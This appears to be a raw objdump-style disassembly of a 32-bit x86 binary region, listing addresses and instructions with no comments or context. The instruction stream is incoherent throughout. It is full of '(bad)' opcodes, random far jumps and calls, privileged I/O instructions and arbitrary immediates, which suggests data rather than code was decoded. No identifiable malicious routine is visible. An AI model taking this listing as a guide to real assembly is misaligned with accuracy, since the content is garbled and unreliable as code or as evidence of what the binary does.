  40fc13:	rcr    BYTE PTR [edx],1
  40fc15:	mov    ebp,0xa936958c
  40fc1a:	mov    ebp,0x3215721
  40fc1f:	out    0x30,eax
  40fc21:	sbb    BYTE PTR [ebp+0x64],dl
  40fc24:	push   es
  40fc25:	test   eax,eax
  40fc27:	ins    DWORD PTR es:[edi],dx
  40fc28:	iret   
  40fc29:	xor    ecx,ecx
  40fc2b:	call   0xcecf:0x9cd55626
  40fc32:	(bad)  
  40fc33:	popf   
  40fc34:	xor    eax,DWORD PTR [esi-0xd1cfc64]
  40fc3a:	jg     0x40fc7d
  40fc3c:	cmp    BYTE PTR [edi-0x5671786],ch
  40fc42:	xchg   edi,eax
  40fc43:	in     eax,dx
  40fc44:	cmc    
  40fc45:	ror    BYTE PTR [edi],cl
  40fc47:	push   0xffffffdf
  40fc49:	pop    ebx
  40fc4a:	jle    0x40fcb6
  40fc4c:	push   ecx
  40fc4d:	inc    ebp
  40fc4e:	outs   dx,BYTE PTR ds:[esi]
  40fc4f:	in     eax,0x6f
  40fc51:	mov    ch,0xf2
  40fc53:	adc    eax,0xfe2d0341
  40fc58:	lock and eax,DWORD PTR [esi]
  40fc5b:	repnz adc esp,ecx
  40fc5e:	outs   dx,BYTE PTR ds:[esi]
  40fc5f:	xor    BYTE PTR [edx+0x43],ch
  40fc62:	aaa    
  40fc63:	loop   0x40fc8f
  40fc65:	std    
  40fc66:	and    BYTE PTR [ebx-0x68b0ffeb],ah
  40fc6c:	cli    
  40fc6d:	add    edx,DWORD PTR [esi]
  40fc6f:	inc    edi
  40fc70:	jns    0x40fc4c
  40fc72:	adc    ch,BYTE PTR [eax+ebp*4-0x418f3d68]
  40fc79:	cwde   
  40fc7a:	leave  
  40fc7b:	dec    ecx
  40fc7c:	adc    eax,0xaf1f1a21
  40fc81:	push   cs
  40fc82:	int    0xed
  40fc84:	cmc    
  40fc85:	inc    esp
  40fc86:	retf   0x70d1
  40fc89:	sbb    al,0xae
  40fc8b:	jp     0x40fc82
  40fc8d:	scas   eax,DWORD PTR es:[edi]
  40fc8e:	outs   dx,BYTE PTR ds:[esi]
  40fc8f:	ficom  WORD PTR [esi-0x17dceb7]
  40fc95:	mov    DWORD PTR [edi+0x70bc2eec],esp
  40fc9b:	mov    eax,eax
  40fc9d:	mov    edx,0x6d8a5113
  40fca2:	das    
  40fca3:	jmp    0x31c3:0xbd6099dd
  40fcaa:	inc    esp
  40fcab:	repz imul edx,DWORD PTR [eax-0x307440f7],0xffffff9d
  40fcb3:	xchg   BYTE PTR [eax+0x42],bl
  40fcb6:	ficomp DWORD PTR [esp+ebx*8+0x3]
  40fcba:	test   al,0x67
  40fcbc:	test   BYTE PTR [ecx+0x301d7605],dl
  40fcc2:	rol    BYTE PTR [ebx],cl
  40fcc4:	sar    DWORD PTR [ebp-0x6436a71c],1
  40fcca:	and    DWORD PTR [edi],eax
  40fccc:	jge    0x40fcb1
  40fcce:	mov    cl,0x29
  40fcd0:	xor    esi,DWORD PTR [ebx-0x59ea617f]
  40fcd6:	loop   0x40fd15
  40fcd8:	jmp    0x23b811b3
  40fcdd:	push   0x5897062c
  40fce2:	xchg   esi,eax
  40fce3:	push   cs
  40fce4:	sbb    DWORD PTR [ebx+0x667bf491],ebx
  40fcea:	xor    DWORD PTR [ebx],esi
  40fcec:	(bad)  
  40fcee:	mov    ch,0xc
  40fcf1:	aaa    
  40fcf2:	xchg   edi,eax
  40fcf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcf4:	fsin   
  40fcf6:	stos   BYTE PTR es:[edi],al
  40fcf7:	and    ah,BYTE PTR [eax-0x65848eac]
  40fcfd:	stc    
  40fcfe:	lds    edi,FWORD PTR [ebp-0x43]
  40fd01:	lock lods al,BYTE PTR ds:[esi]
  40fd03:	in     eax,0xd3
  40fd05:	pop    ebp
  40fd06:	push   0x2
  40fd08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd09:	lds    edi,FWORD PTR [ebx]
  40fd0b:	rcl    DWORD PTR [edi],0x8a
  40fd0e:	(bad)  
  40fd0f:	les    ebx,FWORD PTR [eax+0x6c]
  40fd12:	shl    DWORD PTR [esi],0x42
  40fd15:	xor    DWORD PTR [ecx],esp
  40fd17:	in     al,dx
  40fd18:	mov    edx,0x9bb9f41e
  40fd1d:	call   0x9fe92152
  40fd22:	es out 0xd2,eax
  40fd25:	(bad)  
  40fd26:	nop
  40fd27:	and    ebp,ebp
  40fd29:	stos   BYTE PTR es:[edi],al
  40fd2a:	call   0x9f60:0xc55ef1c6
  40fd31:	sbb    al,0xb0
  40fd34:	push   0xb3a321d9
  40fd39:	fst    QWORD PTR [ebx]
  40fd3b:	dec    ecx
  40fd3c:	jle    0x40fd51
  40fd3e:	aam    0x1b
  40fd40:	nop
  40fd41:	and    eax,0x80f96af2
  40fd46:	pushf  
  40fd47:	push   ebx
  40fd48:	sbb    BYTE PTR [edi],0xaf
  40fd4b:	push   ds
  40fd4c:	mov    al,0xdf
  40fd4e:	jl     0x40fcf6
  40fd50:	(bad)  
  40fd51:	xor    edi,DWORD PTR [ecx]
  40fd53:	loop   0x40fd0b
  40fd55:	inc    edx
  40fd56:	mov    ah,0xe1
  40fd58:	out    0x3,al
  40fd5a:	addr16 (bad) 
  40fd5c:	cld    
  40fd5d:	fld    st(5)
  40fd5f:	lds    esi,FWORD PTR [esp+edi*8-0x6fe507ce]
  40fd66:	mov    al,0xf7
  40fd68:	in     eax,dx
  40fd69:	mov    dl,0xae
  40fd6b:	push   eax
  40fd6c:	or     DWORD PTR [ebp-0x8],edi
  40fd6f:	mov    edx,0x9b6eab64
  40fd74:	(bad)  
  40fd75:	pop    edx
  40fd76:	call   0x625f2b28
  40fd7b:	addr16 je 0x40fd7b
  40fd7e:	std    
  40fd7f:	gs pop edi
  40fd81:	sbb    DWORD PTR [esi-0x74ff0e78],eax
  40fd87:	push   esi
  40fd88:	ret    0x47be
  40fd8b:	(bad)  
  40fd8c:	adc    BYTE PTR [ebx],bh
  40fd8e:	inc    esp
  40fd8f:	dec    eax
  40fd90:	in     eax,dx
  40fd91:	sub    eax,0xa92944ef
  40fd96:	cdq    
  40fd97:	aaa    
  40fd98:	loopne 0x40fd83
  40fd9a:	test   eax,0xf7a0e198
  40fd9f:	fist   WORD PTR [ebp+0x1c932e79]
  40fda5:	(bad)  
  40fda6:	ja     0x40fe16
  40fda8:	hlt    
  40fda9:	sbb    eax,0x11fc4d55
  40fdae:	retf   0x59d1
  40fdb1:	cmp    DWORD PTR [edx],ebp
  40fdb3:	ss push ds
  40fdb5:	jnp    0x40fd63
  40fdb7:	cs inc ebx
  40fdb9:	mov    edx,0x43cfbe51
  40fdbe:	push   ds
  40fdbf:	and    BYTE PTR [esi+0x71040821],al
  40fdc5:	mov    cl,0xfc
  40fdc7:	jecxz  0x40fe3a
  40fdc9:	jmp    0x699a:0xee4901a5
  40fdd0:	pushf  
  40fdd1:	retf   0x576f
  40fdd4:	call   0x2233:0x1e62cb90
  40fddb:	lods   eax,DWORD PTR ds:[esi]
  40fddc:	pop    edx
  40fddd:	mov    BYTE PTR [eax],bl
  40fddf:	xor    DWORD PTR [ebp+0x3cfe1b6c],esi
  40fde5:	and    BYTE PTR [edx],dh
  40fde7:	out    dx,eax
  40fde8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fde9:	imul   DWORD PTR [ebx-0x51]
  40fdec:	popf   
  40fded:	cmp    bh,ch
  40fdef:	cmp    al,ch
  40fdf1:	adc    al,0xf7
  40fdf3:	repz mov eax,0xb054cdb3
  40fdf9:	pop    ebp
  40fdfa:	jmp    0xcee:0x63703aa8
  40fe01:	in     eax,0xae
  40fe03:	jecxz  0x40fe84
  40fe05:	cmp    al,0x84
  40fe07:	push   ebp
  40fe08:	pop    edx
  40fe09:	jbe    0x40fdee
  40fe0b:	aam    0xdc
  40fe0d:	cmp    esp,ecx
  40fe0f:	dec    esp
  40fe10:	popa   
  40fe11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe12:	sub    BYTE PTR [esi],bh
  40fe14:	xchg   esi,eax
  40fe15:	mov    esp,0xbab58707
  40fe1a:	out    dx,al
  40fe1b:	mov    bl,0xb6
  40fe1d:	stos   BYTE PTR es:[edi],al
  40fe1e:	icebp  
  40fe1f:	pop    ebp
  40fe20:	push   ds
  40fe21:	sti    
  40fe22:	mov    WORD PTR [ebp-0x6ddfe8cc],cs
  40fe28:	nop
  40fe29:	mov    esp,0x6af07f56
  40fe2e:	xor    ebp,DWORD PTR [edx+0x4b6feb0a]
  40fe34:	test   eax,0x7357e5d8
  40fe39:	jmp    0xfc2e:0xcb47eaa3
  40fe40:	jecxz  0x40fe3d
  40fe42:	lea    edi,[ebx-0x77]
  40fe45:	push   es
  40fe46:	sbb    al,0x67
  40fe48:	dec    esp
  40fe49:	sub    edi,DWORD PTR [edi]
  40fe4b:	and    dh,cl
  40fe4d:	lahf   
  40fe4e:	cld    
  40fe4f:	xor    al,BYTE PTR [edx-0x7db1d1c7]
  40fe55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe56:	adc    al,0x3f
  40fe58:	cli    
  40fe59:	or     DWORD PTR [eax],edx
  40fe5b:	je     0x40fe06
  40fe5d:	mov    eax,0xe7f8803e
  40fe62:	ss (bad) 
  40fe64:	fsubr  DWORD PTR [ebx]
  40fe66:	out    dx,eax
  40fe67:	mov    ebp,0x9389335b
  40fe6c:	in     eax,0xb1
  40fe6e:	retf   0xc405
  40fe71:	ficomp WORD PTR [eax+ebp*1+0x6b]
  40fe75:	push   cs
  40fe76:	sub    al,ch
  40fe78:	ror    DWORD PTR ss:[ebx],0x2c
  40fe7c:	xor    BYTE PTR [eax],al
  40fe7e:	cmp    BYTE PTR [ecx+0x19],0xe7
  40fe82:	ins    DWORD PTR es:[edi],dx
  40fe83:	enter  0x9c47,0x10
  40fe87:	pop    esp
  40fe88:	add    BYTE PTR [eax-0x677f597],cl
  40fe8e:	fild   WORD PTR [ecx+ebp*2]
  40fe91:	adc    al,0x34
  40fe93:	cmc    
  40fe94:	mov    dl,BYTE PTR [esi-0x301039f]
  40fe9a:	push   ecx
  40fe9b:	into   
  40fe9c:	mov    esi,0x68a62388
  40fea1:	dec    edi
  40fea2:	jmp    0xa8f4973e
  40fea7:	aas    
  40fea8:	daa    
  40fea9:	sbb    BYTE PTR [ebx],cl
  40feab:	mov    al,ds:0xe9b44957
  40feb0:	mov    bl,BYTE PTR [ecx+0x111fb47e]
  40feb6:	sbb    al,0x60
  40feb8:	nop
  40feb9:	ret    0xc7b6
  40febc:	add    eax,0xbfe77cfc
  40fec1:	mov    ebx,0x66d8282c
  40fec6:	out    dx,al
  40fec7:	sbb    al,0x8c
  40fec9:	daa    
  40feca:	mov    edi,0x335bba87
  40fecf:	mov    ebp,0x80ab4cf2
  40fed4:	(bad)  
  40fed5:	push   cs
  40fed6:	out    dx,al
  40fed7:	pop    edi
  40fed8:	dec    edx
  40fed9:	xchg   edx,eax
  40feda:	push   esi
  40fedb:	inc    edi
  40fedc:	or     BYTE PTR [ebp+eiz*4+0x35175471],dh
  40fee3:	xchg   edx,eax
  40fee4:	ret    0xdafc
  40fee7:	hlt    
  40fee8:	test   DWORD PTR [eax+0x71],0x571b0ab5
  40feef:	xchg   ecx,eax
  40fef0:	repz jno 0x40ff41
  40fef3:	daa    
  40fef4:	bound  ebp,QWORD PTR [ebp-0x71203750]
  40fefa:	retf   
  40fefb:	popf   
  40fefc:	xchg   edx,eax
  40fefd:	out    dx,al
  40fefe:	xor    bh,dl
  40ff00:	sbb    eax,DWORD PTR [ebp-0x4655a1c8]
  40ff06:	jecxz  0x40fe95
  40ff08:	aas    
  40ff09:	ret    0x1f07
  40ff0c:	xlat   BYTE PTR ds:[ebx]
  40ff0d:	adc    eax,0x3f3ff6b0
  40ff12:	test   BYTE PTR [esp+ecx*4-0x65],dh
  40ff16:	sar    BYTE PTR [ebp+0x6b],1
  40ff19:	lods   eax,DWORD PTR ds:[esi]
  40ff1a:	out    dx,eax
  40ff1b:	mov    al,ds:0x60956f7c
  40ff20:	inc    ebx
  40ff21:	std    
  40ff22:	sub    eax,0x9501bd72
  40ff27:	test   eax,0x1614ce6c
  40ff2c:	xor    DWORD PTR [eax-0x5e5741eb],ebp
  40ff32:	pop    esp
  40ff33:	loope  0x40ff08
  40ff35:	inc    ecx
  40ff36:	xchg   ecx,eax
  40ff37:	add    al,0x8a
  40ff39:	and    BYTE PTR [eax-0x2ccecce4],bh
  40ff3f:	in     eax,dx
  40ff40:	xchg   esp,eax
  40ff41:	xor    eax,0x441847fc
  40ff46:	or     eax,0x975ddc15
  40ff4b:	xchg   edi,eax
  40ff4c:	xor    DWORD PTR [esi-0x6b],esi
  40ff4f:	loope  0x40ffb1
  40ff51:	cmp    al,0x28
  40ff53:	cmp    al,0x12
  40ff55:	jnp    0x40ff95
  40ff57:	xchg   ebp,eax
  40ff58:	in     al,0x89
  40ff5a:	pop    esp
  40ff5b:	jb     0x40ff8b
  40ff5d:	das    
  40ff5e:	inc    ebp
  40ff5f:	xchg   ebx,edx
  40ff61:	sbb    edi,DWORD PTR [ebx-0x82eef74]
  40ff67:	loope  0x40ff9c
  40ff69:	inc    ebx
  40ff6a:	into   
  40ff6b:	repnz data16 ror BYTE PTR fs:[esi-0x1f],1
  40ff71:	adc    dl,0xb4
  40ff74:	adc    DWORD PTR [edi],edx
  40ff76:	imul   esp,DWORD PTR [ebp+eax*8-0x38],0xffffff87
  40ff7b:	leave  
  40ff7c:	(bad)  
  40ff7d:	jmp    edx
  40ff7f:	jecxz  0x40ff6b
  40ff81:	popf   
  40ff82:	inc    edi
  40ff83:	push   ss
  40ff84:	idiv   BYTE PTR [esi-0x12eb1231]
  40ff8a:	sahf   
  40ff8b:	mov    eax,cs:0xc92aff34
  40ff91:	imul   edx,DWORD PTR [ebp+0x30],0x7bcece53
  40ff98:	loopne 0x40ff7f
  40ff9a:	mov    edx,0x1e309743
  40ff9f:	push   0xa9a5ac78
  40ffa4:	fld    DWORD PTR [edx+0x12]
  40ffa7:	adc    ebx,DWORD PTR [esi-0x39]
  40ffaa:	es push ecx
  40ffac:	loopne 0x41000c
  40ffae:	lods   ax,WORD PTR ds:[esi]
  40ffb0:	adc    eax,0xdd4c149b
  40ffb5:	mov    cl,0xc6
  40ffb7:	adc    eax,0x2f8b2546
  40ffbc:	and    DWORD PTR [edx],edx
  40ffbe:	or     ebp,edx
  40ffc0:	out    0x6b,eax
  40ffc2:	mov    BYTE PTR [ebp+0x7f],al
  40ffc5:	push   ebx
  40ffc6:	pop    ds
  40ffc7:	aam    0xa
  40ffc9:	mov    eax,0xb4b6f0cd
  40ffce:	inc    ebp
  40ffcf:	push   ds
  40ffd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ffd1:	mov    ch,0x3
  40ffd3:	inc    edi
  40ffd4:	loope  0x40fff9
  40ffd6:	fisub  DWORD PTR [esi+0x76b28e7c]
  40ffdc:	and    ecx,DWORD PTR [ecx+ecx*2]
  40ffdf:	adc    eax,DWORD PTR [ebx+eiz*8]
  40ffe2:	mov    cl,0xb
  40ffe4:	jmp    0xa10b:0x9d0e49d5
  40ffeb:	rol    BYTE PTR [ebp+ebp*2+0x48d7e6fd],cl
  40fff2:	and    DWORD PTR [ebp-0x67],ebx
  40fff5:	mov    fs,WORD PTR [edx+0x2fd3c926]
  40fffb:	mov    eax,0x21d2c85f
  410000:	xor    edi,DWORD PTR [edx+0x2afb20f9]
  410006:	lock and eax,0x4d5201e4
  41000c:	cdq    
  41000d:	sbb    bh,bl
  41000f:	sar    BYTE PTR [eax+0x4f],cl
  410012:	cdq    
  410013:	pop    edi
  410014:	dec    si
  410016:	xchg   ebp,eax
  410017:	and    ebx,esi
  410019:	mov    ds:0x18a4406b,eax
  41001e:	sahf   
  41001f:	(bad)  
  410020:	cdq    
  410021:	cdq    
  410022:	xor    cl,cl
  410024:	push   cs
  410025:	inc    ecx
  410026:	scas   al,BYTE PTR es:[edi]
  410027:	and    ebp,ebp
  410029:	inc    ebp
  41002a:	push   cs
  41002b:	out    dx,eax
  41002c:	retf   0xfd24
  41002f:	mov    ah,0xd3
  410031:	(bad)  
  410032:	call   0x3a9da306
  410037:	frstor [ebx-0x49]
  41003a:	xchg   ecx,eax
  41003b:	(bad)  
  41003c:	in     eax,0x55
  41003e:	jae    0x410086
  410040:	sbb    al,0xaf
  410042:	and    BYTE PTR [ecx-0xc37160],dl
  410048:	adc    ah,BYTE PTR [edx+0x1d8d90dc]
  41004e:	aas    
  41004f:	cli    
  410050:	sahf   
  410051:	cld    
  410052:	test   eax,0xd881349c
  410057:	aaa    
  410058:	or     BYTE PTR [ecx-0x9103c5f],ah
  41005e:	push   ebx
  41005f:	mov    WORD PTR [eax+0x3eec0e9b],?
  410065:	addr16 (bad) 
  410067:	bnd call 0xd10930f2
  41006d:	adc    ebx,0xffffffa3
  410070:	mov    dh,0x94
  410072:	add    BYTE PTR [ebp+0x3b],al
  410075:	rcr    DWORD PTR [ebp+0x6905a36f],1
  41007b:	or     cl,BYTE PTR ds:0xb41940cc
  410081:	jl     0x41001b
  410083:	jno    0x410021
  410085:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410086:	das    
  410087:	sub    BYTE PTR [eax-0x4e],ah
  41008a:	sbb    eax,0xb82cbb2
  41008f:	jmp    0xaeff:0x46e98b23
  410096:	cmp    ebx,DWORD PTR [esi]
  410098:	fwait
  410099:	cmp    al,cl
  41009b:	ret    
  41009c:	mov    ch,0xb7
  41009e:	jp     0x4100d9
  4100a0:	fwait
  4100a1:	retf   0x335c
  4100a4:	daa    
  4100a5:	cmp    eax,0x410f9fd6
  4100aa:	repnz shl bh,0x2d
  4100ae:	aas    
  4100af:	mov    eax,ds:0x6698b3cb
  4100b4:	push   edx
  4100b5:	xor    ebx,DWORD PTR [eax+0x72]
  4100b8:	clc    
  4100b9:	and    BYTE PTR [ecx-0x27],dh
  4100bc:	scas   al,BYTE PTR es:[edi]
  4100bd:	aas    
  4100be:	(bad)  
  4100c0:	aaa    
  4100c1:	jmp    DWORD PTR [ecx+0x5f5d1799]
  4100c7:	ja     0x41013e
  4100c9:	lods   al,BYTE PTR ds:[esi]
  4100ca:	xchg   esp,eax
  4100cb:	addr16 pushf 
  4100cd:	pop    edx
  4100ce:	dec    esp
  4100cf:	cmp    al,0xa2
  4100d1:	xlat   BYTE PTR ds:[ebx]
  4100d2:	(bad)  
  4100d3:	icebp  
  4100d4:	addr16 aad 0x6d
  4100d7:	sbb    eax,0x58fe9f49
  4100dc:	clc    
  4100dd:	popa   
  4100de:	mov    ah,0xa
  4100e0:	xor    al,0x77
  4100e2:	xor    al,0x21
  4100e4:	retf   0x1961
  4100e7:	push   esi
  4100e8:	out    0x60,eax
  4100ea:	or     edx,eax
  4100ec:	lahf   
  4100ed:	repnz add BYTE PTR [edi+0x31],dh
  4100f1:	call   0x819c:0xbf6aa64b
  4100f8:	mov    edx,0x222fa3dd
  4100fd:	sbb    BYTE PTR [edi+0x6cb5e994],bl
  410103:	push   ebx
  410104:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410105:	std    
  410106:	lods   al,BYTE PTR ds:[esi]
  410107:	jmp    0x410156
  410109:	stos   BYTE PTR es:[edi],al
  41010a:	pusha  
  41010b:	xchg   esp,eax
  41010c:	and    al,0x27
  41010e:	ins    BYTE PTR es:[edi],dx
  41010f:	out    dx,eax
  410110:	inc    esi
  410111:	push   edi
  410112:	(bad)  
  410113:	sar    DWORD PTR [edx+0xeb6f7c6],cl
  410119:	dec    esi
  41011a:	(bad)  
  41011b:	in     al,dx
  41011c:	nop
  41011d:	repz sbb ecx,DWORD PTR gs:[ecx+ebx*8]
  410122:	jmp    FWORD PTR [edx-0x51aaca46]
  410128:	push   ds
  410129:	addr16 pushf 
  41012b:	(bad)  
  41012c:	cmp    DWORD PTR ds:0x4a8f8984,edx
  410132:	in     al,dx
  410133:	fisub  DWORD PTR [ebp+0x6c]
  410136:	addr16 dec ecx
  410138:	mov    ah,BYTE PTR [esi]
  41013a:	cmp    DWORD PTR [eax+edi*4],ebp
  41013d:	push   cs
  41013e:	cmp    edx,0xfe0f78a7
  410144:	aaa    
  410145:	mov    eax,0x65029a31
  41014a:	fldcw  WORD PTR [ecx-0xad91822]
  410150:	push   esi
  410151:	jp     0x410129
  410153:	sub    DWORD PTR [edx+edi*4-0x80],ecx
  410157:	or     al,0x2d
  410159:	hlt    
  41015a:	xchg   ebx,eax
  41015b:	lods   al,BYTE PTR ds:[esi]
  41015c:	add    eax,0x2e2c3c19
  410161:	cmp    dl,BYTE PTR [ecx+ecx*8+0x7dbbc1b3]
  410168:	jmp    DWORD PTR [ebx-0x3737f839]
  41016e:	push   cs
  41016f:	and    esi,DWORD PTR [ebx]
  410171:	or     dh,BYTE PTR [ebx+esi*8+0x23]
  410175:	push   eax
  410176:	popa   
  410177:	outs   dx,DWORD PTR ds:[esi]
  410178:	fiadd  DWORD PTR [ebx-0x19adcb5e]
  41017e:	pop    edx
  41017f:	dec    edx
  410180:	daa    
  410181:	mov    al,ds:0x76f2ea80
  410186:	sub    esi,DWORD PTR [ebx-0x13fec177]
  41018c:	ja     0x410194
  41018e:	stc    
  41018f:	pop    ds
  410190:	pop    ebp
  410191:	in     eax,dx
  410192:	pop    ebp
  410193:	fld    DWORD PTR [ecx+esi*8+0x164de9e7]
  41019a:	sbb    BYTE PTR [eax],0xd8
  41019d:	mov    ds:0xabed6757,al
  4101a2:	push   edx
  4101a3:	mov    ds:0x4ef038a7,eax
  4101a8:	(bad)  
  4101a9:	neg    DWORD PTR [ecx-0x5d]
  4101ac:	dec    esi
  4101ad:	pop    eax
  4101ae:	xchg   ebx,eax
  4101af:	repnz sub BYTE PTR [ecx+0x55],0xb2
  4101b4:	mov    ebx,0x1eb03247
  4101b9:	into   
  4101ba:	retf   
  4101bb:	and    al,0x6f
  4101bd:	lods   eax,DWORD PTR ds:[esi]
  4101be:	pop    edx
  4101bf:	xor    bh,cl
  4101c1:	inc    eax
  4101c2:	mul    cl
  4101c4:	je     0x41020b
  4101c6:	inc    esp
  4101c7:	xor    BYTE PTR [eax-0x74d83c24],0x61
  4101ce:	dec    esi
  4101cf:	(bad)  
  4101d0:	aad    0xa
  4101d2:	pop    ecx
  4101d3:	call   0xd84a:0x6bac984f
  4101da:	sub    BYTE PTR [ecx],al
  4101dc:	jae    0x4101fe
  4101de:	or     DWORD PTR [ecx+0x42],esi
  4101e1:	loopne 0x4101da
  4101e3:	cdq    
  4101e4:	or     esi,esp
  4101e6:	mov    esi,0xb3ea704
  4101eb:	add    BYTE PTR ss:[edx],0xab
  4101ef:	xchg   esp,eax
  4101f0:	mov    WORD PTR [eax],ds
  4101f2:	jns    0x4101b6
  4101f4:	out    dx,al
  4101f5:	aaa    
  4101f6:	(bad)  
  4101f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101f9:	push   ebp
  4101fa:	pop    ds
  4101fb:	ficom  DWORD PTR [edi]
  4101fd:	lods   eax,DWORD PTR ds:[esi]
  4101fe:	pop    ebp
  4101ff:	fidiv  WORD PTR [ebp+0x12]
  410202:	jae    0x410220
  410204:	push   0x11
  410206:	sub    esp,DWORD PTR [ebp-0x5063127f]
  41020c:	cmp    ah,BYTE PTR [edx-0x59]
  41020f:	inc    eax
  410210:	cmp    eax,0x23393a1e
  410215:	fimul  DWORD PTR [edi-0x69]
  410218:	push   esi
  410219:	push   esi
  41021a:	daa    
  41021b:	pop    eax
  41021c:	js     0x4101f0
  41021e:	mov    ch,0xbf
  410220:	mov    bh,0x56
  410222:	int3   
  410223:	dec    edi
  410224:	xchg   esi,eax
  410225:	xchg   esp,ebp
  410227:	mov    WORD PTR [ecx-0x63],fs
  41022a:	cwde   
  41022b:	cmp    dl,BYTE PTR [ebx]
  41022d:	push   0x151c1ad4
  410232:	jns    0x410230
  410234:	pushf  
  410235:	sar    edx,cl
  410237:	pop    ebx
  410238:	(bad)
  41023c:	cmp    esp,ebx
  41023e:	lock std 
  410240:	es xchg edi,eax
  410242:	sbb    BYTE PTR [eax*8-0x4642c9b9],dl
  410249:	out    0x4a,al
  41024b:	jne    0x41022c
  41024d:	sti    
  41024e:	dec    esi
  41024f:	add    ecx,DWORD PTR [eax+0xab597e2]
  410255:	or     dl,BYTE PTR [eax]
  410257:	jno    0x410281
  410259:	aad    0x3e
  41025b:	(bad)  
  41025c:	or     eax,0xea5d2372
  410261:	jp     0x41022d
  410263:	mov    ds,WORD PTR [edx+0x74983af7]
  410269:	sub    edi,DWORD PTR [ecx+ecx*8-0x7d]
  41026d:	aaa    
  41026e:	clc    
  41026f:	pop    eax
  410270:	(bad)  
  410271:	fdiv   DWORD PTR [eax+0x42]
  410274:	sub    bh,al
  410276:	mov    ah,0x58
  410278:	push   es
  410279:	std    
  41027a:	sbb    DWORD PTR [ebx+0x55],ecx
  41027d:	sub    BYTE PTR [ecx+0x6],bl
  410280:	pop    edi
  410281:	xchg   DWORD PTR [edi+0x295196b5],ebp
  410287:	jmp    0xf53f4b38
  41028c:	and    ah,BYTE PTR [ebx-0x61]
  41028f:	in     al,dx
  410290:	mov    al,ds:0xf4d2cee
  410295:	push   edx
  410296:	fstp   TBYTE PTR [ebp-0x722a0adc]
  41029c:	int    0x80
  41029e:	or     eax,0xe6c45e63
  4102a3:	inc    edx
  4102a4:	inc    edi
  4102a5:	xor    eax,0xf4a963e7
  4102aa:	(bad)  
  4102ab:	fistp  WORD PTR [ecx+edx*1+0x1633fd89]
  4102b2:	cmp    BYTE PTR [edi],ch
  4102b4:	aas    
  4102b5:	pop    ebx
  4102b6:	sbb    ebp,DWORD PTR [edi-0x4efee38b]
  4102bc:	aad    0x9b
  4102be:	les    ecx,FWORD PTR ds:0x6eae770a
  4102c4:	das    
  4102c5:	xorps  xmm7,XMMWORD PTR [esi+0x66]
  4102c9:	pop    ds
  4102ca:	(bad)  
  4102cb:	fisttp WORD PTR ss:[eax]
  4102ce:	cmp    bl,BYTE PTR [esi]
  4102d0:	pop    ss
  4102d1:	js     0x41033b
  4102d3:	popf   
  4102d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102d5:	jle    0x410337
  4102d7:	push   0xbea8921d
  4102dc:	mov    ds:0xab6fb6f1,eax
  4102e1:	lahf   
  4102e2:	in     al,0xb8
  4102e4:	das    
  4102e5:	out    dx,eax
  4102e6:	mul    BYTE PTR [ecx+0x66f377f1]
  4102ec:	mov    ch,0x2c
  4102ee:	mov    edx,0xe55844df
  4102f3:	xchg   esi,eax
  4102f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102f5:	jecxz  0x410355
  4102f7:	xchg   esp,eax
  4102f8:	mov    edx,0x3216ecc3
  4102fd:	data16 daa 
  4102ff:	fistp  QWORD PTR [edx]
  410302:	in     al,0x23
  410304:	mov    bh,0x90
  410306:	test   DWORD PTR [edi-0x3c],0x8e51ea4e
  41030d:	sbb    dl,ah
  41030f:	retf   
  410310:	sbb    DWORD PTR [ecx-0x14696592],edi
  410316:	fild   WORD PTR [edi+0x16]
  410319:	fild   WORD PTR [esi-0x41499485]
  41031f:	add    DWORD PTR [ebp+edi*2+0x28],ebp
  410323:	les    ebp,FWORD PTR [edi-0x7586bdb2]
  410329:	inc    edx
  41032a:	cld    
  41032b:	test   eax,0xa964ec09
  410330:	mov    ebp,0x1799110b
  410335:	jne    0x410388
  410337:	inc    ebx
  410338:	loop   0x4102ed
  41033a:	jo     0x41034f
  41033c:	sti    
  41033d:	pusha  
  41033e:	mov    dh,0x14
  410340:	add    dh,ah
  410342:	adc    al,0xd7
  410344:	icebp  
  410345:	add    BYTE PTR [esi+ecx*1+0x68d32d12],bh
  41034c:	lds    esi,FWORD PTR [eax]
  41034e:	add    esp,DWORD PTR [ebp+0x46]
  410351:	fisubr WORD PTR [edi-0x5315c4fe]
  410357:	ror    ebp,cl
  410359:	dec    edx
  41035a:	mov    esi,ecx
  41035c:	neg    edx
  41035e:	xor    BYTE PTR [ecx+0x31960e52],cl
  410364:	lods   eax,DWORD PTR ds:[esi]
  410365:	adc    eax,0xf199431f
  41036a:	out    0xc8,eax
  41036c:	jno    0x410352
  41036e:	mov    eax,eax
  410370:	jnp    0x4103e9
  410372:	rol    BYTE PTR [ebx+0x1ea37869],cl
  410378:	stc    
  410379:	cld    
  41037a:	dec    ecx
  41037b:	hlt    
  41037c:	outs   dx,DWORD PTR ds:[esi]
  41037d:	push   ds
  41037e:	in     al,0x91
  410380:	loope  0x4103a1
  410382:	retf   
  410383:	mov    ds:0x8a436631,al
  410389:	push   eax
  41038a:	jmp    DWORD PTR [esi+0x31]
  41038d:	pop    ebx
  41038e:	xor    ebx,DWORD PTR [ebx+0x518e92ae]
  410394:	loopne 0x4103a6
  410396:	in     al,0xfc
  410398:	cdq    
  410399:	push   ss
  41039a:	add    bh,dl
  41039c:	or     al,cl
  41039e:	or     esp,esp
  4103a0:	add    eax,0x4bee67e8
  4103a5:	int3   
  4103a6:	call   0xf362:0x348b5b4
  4103ad:	xchg   ebp,eax
  4103ae:	sar    DWORD PTR [esi-0x75],0xa0
  4103b2:	inc    edi
  4103b3:	sub    cl,cl
  4103b5:	xchg   ebp,eax
  4103b6:	and    dh,dl
  4103b8:	inc    esi
  4103b9:	pushf  
  4103ba:	sub    BYTE PTR [ebx+esi*1+0x120b3a31],cl
  4103c1:	pop    ebx
  4103c2:	push   0xa608b472
  4103c7:	icebp  
  4103c8:	sbb    cl,cl
  4103ca:	outs   dx,DWORD PTR ds:[esi]
